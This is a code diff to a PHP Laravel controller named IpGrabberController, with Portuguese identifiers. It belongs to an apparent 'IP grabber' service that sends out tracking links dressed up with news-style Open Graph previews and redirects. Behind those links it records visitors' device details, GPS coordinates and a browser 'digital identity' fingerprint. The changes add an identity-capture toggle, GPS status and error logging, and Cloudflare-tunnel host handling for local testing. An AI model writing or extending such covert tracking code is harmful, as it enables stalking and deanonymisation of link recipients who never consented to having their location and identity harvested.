@@ -37,16 +37,19 @@ class IpGrabberController extends Controller
         $ogDescricao = $ipGrabber?->og_descricao ?? '';
         $ogImagem = $this->resolverImagemOpenGraph($ipGrabber, $request);
         $ogUrl = $ipGrabber
-            ? ($ipGrabber->trackingDomain() ? $ipGrabber->trackingUrl() : $this->urlAbsolutaDaRequisicao($request, route('pixel.track', $token, false)))
+            ? ($this->deveUsarHostDaRequisicao($request) || ! $ipGrabber->trackingDomain()
+                ? $this->urlAbsolutaDaRequisicao($request, route('pixel.track', $token, false))
+                : $ipGrabber->trackingUrl())
             : $this->urlAbsolutaDaRequisicao($request, $request->getPathInfo());
         $captureGps = (bool) $ipGrabber?->capture_gps;
+        $captureIdentity = (bool) $ipGrabber?->capture_identity;
         $redirectUrl = $this->deveRedirecionarParaNoticia($request, $ipGrabber) ? $ipGrabber->noticia_url : null;
 
         if ($this->requisicaoDePreviewOuPrefetch($request)) {
             return view('pixel.preview', compact('ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
         }
 
-        return view('pixel.landing', compact('mensagem', 'token', 'accessUuid', 'captureGps', 'redirectUrl', 'ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
+        return view('pixel.landing', compact('mensagem', 'token', 'accessUuid', 'captureGps', 'captureIdentity', 'redirectUrl', 'ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
     }
 
     public function gif(Request $request, string $token): Response
@@ -82,13 +85,19 @@ class IpGrabberController extends Controller
 
     public function atualizarDispositivo(Request $request, string $token): \Illuminate\Http\JsonResponse
     {
-        if (! $this->deveRegistrarCaptura($request)) {
+        if (! $request->isMethod('POST') || $this->modoPreviewManual($request) || $this->requisicaoDePreviewOuPrefetch($request)) {
             return response()->json(['ok' => false]);
         }
 
         $ipGrabber = IpGrabber::where('token', $token)->whereNotNull('clicked_at')->first();
 
         if (! $ipGrabber) {
+            return response()->json(['ok' => false]);
+        }
+
+        $acesso = $this->resolverAcessoParaAtualizacao($request, $ipGrabber);
+
+        if (! $acesso) {
             return response()->json(['ok' => false]);
         }
 
@@ -119,13 +128,18 @@ class IpGrabberController extends Controller
         }
 
         $dadosGps = $ipGrabber->capture_gps ? $this->dadosGpsValidados($request) : [];
+        $dadosGpsStatus = $ipGrabber->capture_gps ? $this->dadosStatusGpsValidados($request) : [];
 
         if (! empty($dadosGps)) {
             $dados = array_merge($dados, $dadosGps);
         }
 
+        if (! empty($dadosGpsStatus)) {
+            $dados = array_merge($dados, $dadosGpsStatus);
+        }
+
         // Identidade Digital capturada pelo browser
-        $dadosIdentidade = $this->dadosIdentidadeValidados($request);
+        $dadosIdentidade = $ipGrabber->capture_identity ? $this->dadosIdentidadeValidados($request) : [];
 
         if (! empty($dadosIdentidade)) {
             $dados = array_merge($dados, $dadosIdentidade);
@@ -133,10 +147,7 @@ class IpGrabberController extends Controller
 
         if (! empty($dados)) {
             $ipGrabber->update($dados);
-
-            if ($acesso = $this->resolverAcessoParaAtualizacao($request, $ipGrabber)) {
-                $acesso->update($dados);
-            }
+            $acesso->update($dados);
         }
 
         return response()->json(['ok' => true]);
@@ -190,6 +201,10 @@ class IpGrabberController extends Controller
 
         if (is_string($uuid) && Str::isUuid($uuid)) {
             return $ipGrabber->acessos()->where('uuid', $uuid)->latest('accessed_at')->first();
+        }
+
+        if ($request->user()) {
+            return null;
         }
 
         return $ipGrabber->acessos()->where('endpoint', 'pagina')->latest('accessed_at')->first();
@@ -283,6 +298,24 @@ class IpGrabberController extends Controller
             if ($accuracy !== false && $accuracy >= 0) {
                 $dados['gps_accuracy'] = round((float) $accuracy, 2);
             }
+        }
+
+        return $dados;
+    }
+
+    private function dadosStatusGpsValidados(Request $request): array
+    {
+        $dados = [];
+        $status = $request->input('gps_status');
+
+        if (is_string($status) && in_array($status, ['captured', 'denied', 'unavailable', 'timeout', 'unsupported', 'insecure', 'skipped', 'error'], true)) {
+            $dados['gps_status'] = $status;
+        }
+
+        $error = $request->input('gps_error');
+
+        if (is_string($error) && $error !== '') {
+            $dados['gps_error'] = mb_substr($error, 0, 120);
         }
 
         return $dados;
@@ -425,7 +458,7 @@ class IpGrabberController extends Controller
             $dimensions = $this->dimensoesDaImagem(Storage::disk('public')->path($path));
 
             return [
-                'url' => $ipGrabber->trackingDomain()
+                'url' => $ipGrabber->trackingDomain() && ! $this->deveUsarHostDaRequisicao($request)
                     ? $ipGrabber->trackingAssetUrl(route('pixel.og-image', $ipGrabber->token, false))
                     : $this->urlAbsolutaDaRequisicao($request, route('pixel.og-image', $ipGrabber->token, false)),
                 'type' => $this->mimeTypePorExtensao($path) ?: Storage::disk('public')->mimeType($path),
@@ -447,6 +480,12 @@ class IpGrabberController extends Controller
         $host = $request->headers->get('X-Forwarded-Host') ? explode(',', $request->headers->get('X-Forwarded-Host'))[0] : $request->getHttpHost();
 
         return trim($scheme) . '://' . trim($host) . '/' . ltrim($path, '/');
+    }
+
+    private function deveUsarHostDaRequisicao(Request $request): bool
+    {
+        return app()->environment('local')
+            && str_ends_with($request->getHost(), '.trycloudflare.com');
     }
 
     private function mimeTypePorExtensao(string $path): ?string
